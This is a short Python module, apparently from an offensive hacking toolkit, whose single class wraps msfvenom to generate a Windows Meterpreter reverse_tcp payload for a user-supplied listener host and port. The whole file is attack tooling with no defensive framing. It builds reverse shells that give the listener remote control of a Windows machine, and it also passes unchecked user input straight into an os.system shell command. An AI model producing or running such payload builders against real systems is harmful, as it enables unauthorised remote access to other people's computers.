#Modules
from etc.banner import banner_drgn
from etc.set import clear
from etc.set import *
from lib.list import list_tools
from lib.list import list_Shell
#===================
import sys,os,socket,time,datetime
#===================
NFound='\n\u001b[1m[\u001b[31mNot Found Choice!\u001b[0m\u001b[1m]\u001b[0m'
Aborted='\n\u001b[1m[\u001b[31mABORTED!\u001b[0m\u001b[1m]\u001b[0m'
#===================
class shell_windows_meterpreter:
    def __init__(self, lhost, lport, language):
        self.lhost = lhost
        self.lport = lport
        self.language = language
        try:
            clear()
            print('''
  [+] LOCAL HOST : {}
  [+] LOCAL PORT : {}
  [+] LANGUAGE   : {}
  [!] Loading ....'''.format(self.lhost, self.lport, self.language))
            os.system('msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} -f {}'.format(self.lhost, self.lport, self.language))
            sys.exit('\u001b[1m[\u001b[32;1mSUCCESSFULLY\u001b[0m\u001b[1m]\u001b[0m')
        except KeyboardInterrupt:
            sys.exit(Aborted)
